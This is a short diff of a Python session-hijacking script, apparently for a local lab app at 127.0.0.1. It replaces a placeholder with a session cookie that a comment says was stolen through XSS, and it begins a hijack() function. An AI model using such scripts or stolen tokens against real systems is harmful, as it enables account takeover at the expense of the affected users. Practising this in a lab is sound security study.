@@ -4,7 +4,7 @@ import time
 TARGET_URL = "http://127.0.0.1:5000/dashboard"
 
 # After stealing a cookie via XSS, paste its value here.
-STOLEN_SESSION_COOKIE = "REPLACE_ME_WITH_STOLEN_COOKIE_STRING"
+STOLEN_SESSION_COOKIE = "eyJzZXNzaW9uX2lkIjoiZmMzM2Q2Y2UtY2IyMC00OTdiLTg0OTctNTMwY2JlODUxNjQxIn0.arIo4g.GQogD65_W6Ie-6ecK8QGkoo6dHo"
 
 def hijack():
     print("="*50)
